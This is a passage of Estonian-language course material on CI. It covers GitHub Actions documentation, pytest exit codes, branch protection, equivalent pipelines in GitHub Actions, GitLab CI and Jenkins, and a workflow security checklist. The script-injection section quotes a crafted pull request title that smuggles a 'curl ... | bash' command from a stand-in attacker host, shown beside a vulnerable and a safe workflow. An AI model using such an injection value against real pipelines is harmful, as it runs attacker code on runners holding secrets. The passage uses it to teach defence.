Otsi nii. Kui tahad teada, mis võtmed on olemas ja mida need tähendavad, ava **Reference**. Kui tahad teada, kuidas midagi teha, ava **How-tos**. Lehe paremal üleval on otsingukast. Kui töövoog annab vea, kopeeri veateate põhiosa otsingusse, ilma sinu failinimede ja harude nimedeta. Dokumentatsioon on inglise keeles, aga võtmete nimed (`needs`, `runs-on`, `with`) on samad, mida kirjutad oma faili, seega leiad need ka otsinguga lehelt üles (++ctrl+f++).

Valmis töövooge, millest alustada, leiad mitmest kohast. Repositooriumi vahekaardil **Actions** on nupp **New workflow**. GitHub vaatab, mis keeles on repositooriumi kood, ja pakub sobivaid CI malle, Pythoni koodiga repositooriumile näiteks Pythoni testide malli. Samad mallid on repositooriumis [actions/starter-workflows](https://github.com/actions/starter-workflows) ja nende kasutamine on kirjeldatud lehel [Use workflow templates](https://docs.github.com/en/actions/how-tos/write-workflows/use-workflow-templates). Pythoni rakenduse testimiseks on GitHubil eraldi juhend [Building and testing Python](https://docs.github.com/en/actions/tutorials/build-and-test-code/python). Praktikumi töö `test` järgib sama mustrit: `setup-python`, `pip install` ja `pytest`.

---

## 7. Millal konveier katkeb

Iga käsk annab lõpetamisel **väljumiskoodi** (exit code). See on sama number, mida näed terminalis käsuga `echo $?`. Väljumiskood `0` tähendab, et käsk õnnestus. Iga muu number tähendab viga. Kui mõne sammu käsk lõpetab koodiga, mis ei ole `0`, on samm punane ja konveier katkeb.

Väljumiskoodi järgi saad aru, kas viga on rakenduse koodis või töövoos. pytest'i koodide täielik nimekiri on [pytest'i dokumentatsioonis](https://docs.pytest.org/en/stable/reference/exit-codes.html).

| Väljumiskood | Tähendus | Näide CI-s |
|---|---|---|
| `0` | kõik on korras | testid läbisid ja samm on roheline |
| `1` | mõni test kukkus | `AssertionError`, viga on **koodis** |
| `4` | pytest'i käsk on vale, näiteks kausta ei ole | `file or directory not found`, viga on **töövoos** (näiteks puudub checkout) |
| `5` | teste ei leitud | testifaili nimi ei alga sõnaga `test_` |
| `127` | käsku ei ole olemas | `pytest: command not found`, tööriist on paigaldamata |

*Tabel 7.9. Väljumiskood ütleb, kas viga on koodis või konveieris.*

Enamikus meeskondades kehtib reegel, et pull request'i ei saa harusse `main` liita enne, kui kõik nõutud kontrollid on rohelised. Nii on see tehtud meelega. Parem on, kui konveier peatab liitmise kohe, kui et katkine kood jõuab harusse `main` ja sealt tootmisse.

N2-s seadistasid Märteni näitel haru `main` kaitse. **Ruleset** on GitHubi reeglite kogum, mis määrab, mida harus tohib teha. N2 reegel nõudis, et muudatuse vaataks üle inimene. CI lisab samasse ruleset'i reegli [**Require status checks to pass**](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets): liita saab ainult siis, kui CI töö on roheline. Inimene hindab, kas lahendus on mõistlik, ja CI kontrollib, kas see töötab. Kumbki ei asenda teist.

---

## 8. Sama mõte, teised tööriistad

GitHub Actions on üks paljudest CI tööriistadest. Eesti ettevõtetes kasutatakse sama sageli [**GitLab CI**](https://docs.gitlab.com/ci/yaml/)-d. Seda eelistavad näiteks pangad ja riigiasutused, kes hoiavad koodi oma serveris. Teine levinud tööriist on [**Jenkins**](https://www.jenkins.io/doc/book/pipeline/), mis on vanem ja töötab samuti oma serveris. Kõigis kolmes on sama põhimõte: sündmus käivitab konveieri, konveier saab masina, sammud tehakse järjest ja väljumiskood otsustab tulemuse.

Allpool on sama konveier kolmes tööriistas. Süntaksit ei pea pähe õppima. Leia igast failist need osad, mis on sulle GitHub Actionsist tuttavad.

=== "GitHub Actions"

    `.github/workflows/ci.yml`

    ```yaml
    on: [push, pull_request]

    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v7
          - uses: actions/setup-python@v7
            with:
              python-version: "3.12"
          - run: pip install -r flask/requirements.txt pytest
          - run: pytest flask -v

      konteiner:
        needs: test
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v7
          - run: docker build -t flask-app ./flask
    ```

=== "GitLab CI"

    `.gitlab-ci.yml` (repositooriumi juurkaustas)

    ```yaml
    stages:
      - test
      - konteiner

    test:
      stage: test
      image: python:3.12
      script:
        - pip install -r flask/requirements.txt pytest
        - pytest flask -v

    konteiner:
      stage: konteiner
      image: docker:27
      services:
        - docker:27-dind
      script:
        - docker build -t flask-app ./flask
    ```

=== "Jenkins"

    `Jenkinsfile` (repositooriumi juurkaustas)

    ```groovy
    pipeline {
        agent any
        stages {
            stage('test') {
                steps {
                    sh 'python3 -m venv .venv'
                    sh '.venv/bin/pip install -r flask/requirements.txt pytest'
                    sh '.venv/bin/pytest flask -v'
                }
            }
            stage('konteiner') {
                steps {
                    sh 'docker build -t flask-app ./flask'
                }
            }
        }
    }
    ```

| Mõiste | GitHub Actions | GitLab CI | Jenkins |
|---|---|---|---|
| Fail | `.github/workflows/*.yml` | `.gitlab-ci.yml` | `Jenkinsfile` |
| Keel | YAML | YAML | Groovy |
| Kes sammud käivitab | runner | runner | agent |
| Masin | iga kord **värske virtuaalmasin** | iga kord **värske konteiner** `image:` järgi | sageli **püsiv server** |
| Koodi toomine | töövoos: `actions/checkout` | automaatne | automaatne (*Pipeline from SCM*) |
| Pythoni versioon | action `setup-python` | `image: python:3.12` | peab serveris juba olemas olema |
| Järjekord | `needs:` | `stages:` | `stage`-plokid järjest |
| Saladused | Secrets | CI/CD Variables | Credentials |

*Tabel 7.10. Kolm tööriista, üks mudel.*

<figure markdown="span">
  ![Kolm veergu: GitHub Actions saab iga käivituse jaoks uue tühja virtuaalmasina, GitLab CI uue konteineri image'ist python:3.12, Jenkins kasutab sama serverit, kuhu kogunevad eelmiste käivituste failid ja ajutiselt paigaldatud teegid](../images/n07_kolm_tooriista.svg)
  <figcaption>Joonis 7.6. GitHub ja GitLab alustavad iga käivitust nullist. Jenkinsi püsiv server kogub prügi ja toob „töötab minu masinas" tagasi (Talvik, 2026).</figcaption>
</figure>

Vaata tabelis rida **Masin**. GitHub ja GitLab alustavad iga kord tühjast masinast. Jenkinsi agent on sageli sama server, mis töötab kuude kaupa. Sinna jäävad eelmiste käivituste failid ja keegi paigaldab sinna ajutiselt mõne teegi. Siis tekib sama probleem, mida CI pidi lahendama: konveier töötab ainult selles ühes serveris. Seepärast käivitatakse ka Jenkinsis samme tänapäeval konteinerites, näiteks `agent { docker { image 'python:3.12' } }`.

### Konveier hoiab võtmeid

Konveier ei piirdu testidega. N8-s saab konveier õiguse saata image'eid registrisse ja hiljem ka serveritesse SSH-ga sisse logida. Selleks vajab konveier paroole, tokeneid ja võtmeid. Seetõttu muutub konveier ise ründajale huvitavaks sihtmärgiks. Kes saab kätte CI saladused, pääseb ligi kõigele, kuhu CI ligi pääseb.

GitGuardiani koomiks [Compromising CI/CD Pipelines with Leaked Credentials](https://blog.gitguardian.com/security-zines-2-compromising-ci-cd-pipelines/) näitab viie pildiga, kuidas üks unustatud Jenkinsi parool võimaldab üle võtta kogu tarneahela.

Igas CI tööriistas kehtib sama põhimõte: saladus ei ole repositooriumis ega logis ja igal tokenil on ainult vajalikud õigused. GitHub Actionsi jaoks on need reeglid kontrollnimekirjana järgmises osas.

N4-s hoidsid paroole Vaultis ja peitsid need Ansible'i väljundis võtmega `no_log: true`. CI saladuste hoidmine põhineb samal mõttel.

---

## 9. Töövoo turvalisus

Töövoog käivitab koodi, millel on ligipääs repositooriumile ja saladustele. Seepärast tuleb töövoogu kontrollida samamoodi nagu rakenduse koodi. GitHubi soovitused on koos lehel [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use). Allpool on neist kõige tähtsamad kontrollnimekirjana. Iga punkti juures on kirjas, mida saad ise kontrollida.

**Saladused.** Saladust ei kirjutata kunagi töövoo faili lihttekstina. Iga parool või token on eraldi saladus, nii saab ühe saladuse vahetada ilma teisi puutumata. Kui saladus jõudis siiski logisse, kustuta see logi ja vaheta saladus kohe uue vastu ([Secrets](https://docs.github.com/en/actions/concepts/security/secrets)). **Kontrolli:** failis `ci.yml` ei ole ühtegi parooli ja kõik saladused on kujul `${{ secrets.NIMI }}`.

**`GITHUB_TOKEN` vähimate õigustega.** Iga käivituse jaoks loob GitHub ajutise tokeni `GITHUB_TOKEN`. Kursuse organisatsioonis on sellel vaikimisi ainult lugemisõigus. Kui töö vajab rohkem, küsib see õigust võtmega `permissions` ([GITHUB_TOKEN](https://docs.github.com/en/actions/concepts/security/github_token)). **Kontrolli:** ava töö logis samm **Set up job** ja vaata lõiku `GITHUB_TOKEN Permissions`. N8-s annad tööle kirjutamisõiguse.

**Võõrad action'id.** Action on kellegi teise kood, mis käivitub sinu runneris ja näeb sinu faile. Enne kasutamist vaata action'i lähtekoodi ja seda, kes on autor. GitHubi enda action'id on organisatsioonis `actions`. Tag'i, näiteks `@v7`, saab autor hiljem teisele commit'ile ümber tõsta. Täispikk commit'i räsi (SHA) ei muutu kunagi ([Lock workflow dependencies](https://docs.github.com/en/actions/how-tos/secure-your-work/lock-workflow-dependencies)):

```yaml
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Kommentaar rea lõpus näitab inimesele, mis versioon see räsi on.

Marketplace'is olemine ei tähenda, et action on kontrollitud. Action avaldatakse Marketplace'is kohe ja GitHub seda üle ei vaata, kui on täidetud kolm nõuet: repositoorium on avalik, selle juurkaustas on üks fail `action.yml` (või `action.yaml`) ja action'i nimi on Marketplace'is ainulaadne ([Publishing actions in GitHub Marketplace](https://docs.github.com/en/actions/how-tos/create-and-publish-actions/publish-in-github-marketplace)). Märk **Verified creator** tähendab ainult seda, et GitHub on kinnitanud autori oma partnerorganisatsioonina. Koodi see märk ei kinnita. Action on tavaline repositoorium, mille juurkaustas on fail `action.yml`, ja selle koodi saad üle vaadata nagu iga teise koodi.

**Kontrolli:** vaata oma töövoo iga rida `uses:`, ava action'i repositoorium ja leia, kes on autor ja mida fail `action.yml` käivitab.

**Skripti süstimine** (script injection). Mõned väärtused tulevad kasutajalt, näiteks pull request'i või issue pealkiri. Kui selline väärtus pannakse otse käsu sisse, võib pealkirjas olev tekst käivituda käsuna ([Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)). Näiteks pealkiri `a"; curl ründaja.ee | bash; echo "` muutuks Bashi käskudeks.

Ohtlik, sest GitHub paneb pealkirja teksti otse skripti sisse:

```yaml
      - run: echo "${{ github.event.pull_request.title }}"
```

Turvaline, sest pealkiri jõuab skripti keskkonnamuutujana ja Bash käsitleb seda tekstina:

```yaml
      - env:
          PEALKIRI: ${{ github.event.pull_request.title }}
        run: echo "$PEALKIRI"
```

**Kontrolli:** real `run:` ei ole kirjutist `${{ github.event... }}`. Kasutaja antud väärtus tuleb võtme `env:` kaudu.

**Ohtlikud sündmused ja runnerid.** Sündmust `pull_request_target` väldi, kui see ei ole hädavajalik. See käivitab töövoo haru `main` õigustega ja saladustega ka võõra repositooriumi pull request'i puhul. Oma runner (*self-hosted runner*) ei sobi avalikule repositooriumile, sest igaüks saab teha pull request'i, mille kood käivitub sinu serveris ([Compromised runners](https://docs.github.com/en/actions/concepts/security/compromised-runners)). **Kontrolli:** sinu töövoos on sündmused `push` ja `pull_request` ning runner on `ubuntu-latest`.

**Automaatne kontroll.** Dependabot teeb pull request'i, kui töövoos kasutatud action'ist ilmub uus versioon ([Dependabot ja action'id](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot)). Tööriist [OpenSSF Scorecard](https://github.com/ossf/scorecard) kontrollib repositooriumi automaatselt: kas tokeni õigused on piiratud, kas action'id on kinnitatud räsiga ja kas töövoos on süstimise ohtu. Praktikumi lisaülesandes saad Dependaboti seadistada.

---

## 10. Miks see töökohas oluline on

Suurtes makseteenustes on tuhandeid automaatteste, mis kontrollivad maksete loogikat ja valuutade teisendamist. Iga pull request käivitab need testid enne, kui keegi muudatust üldse üle vaatama hakkab.

Muudatuse autor saab tagasiside mõne minutiga. Viga leitakse enne väljalaset, kui see ei ole veel tootmises ega mõjuta kasutajate raha. Seepärast on CI tänapäeval tavapraktika. Tööintervjuul küsitakse, kas oled CI-d seadistanud, sama loomulikult kui seda, kas oskad Giti kasutada.

---

## Kokkuvõte

??? abstract "Kokkuvõte"

    - Testimine peab meeskonnas olema automaatne. See ei tohi sõltuda inimese mälust ega tema arvutist.
    - Automaattest on koodina kirjutatud kontroll. `assert` ütleb, kas tulemus on õige.
    - Ühiktest kontrollib koodi. Suitsutest kontrollib, kas konteiner käivitub ja vastab.
    - Töövoog on YAML-fail kaustas `.github/workflows/`. Selles on sündmus (`on:`), tööd (`jobs:`) ja sammud (`steps:`).
    - `uses:` käivitab valmis action'i, `run:` käivitab Bashi käsu ja `needs:` paneb tööd järjekorda.
    - Runner on tühi masin. Kõik, mida see vajab, peab olema kirjas repositooriumis.
    - Võtmete süntaksi leiad dokumentatsiooni osast Reference, juhendid osast How-tos ja action'ite parameetrid Marketplace'ist.
    - Konveier katkeb, kui väljumiskood ei ole `0`. Kood näitab, kas viga on rakenduses või töövoos.
    - CI koos haru `main` kaitsega tähendab, et punase testiga koodi ei saa liita.
    - GitHub Actionsil, GitLab CI-l ja Jenkinsil on erinev süntaks, aga sama mudel.
    - Konveier hoiab võtmeid. Saladused on tööriista saladuste hoidlas, mitte repositooriumis ega logis.

---

Praktikumis kirjutad Flaskile testid ja koostad töövoo rida haaval. Iga puuduv rida annab vea, mille leiad ja parandad ise.
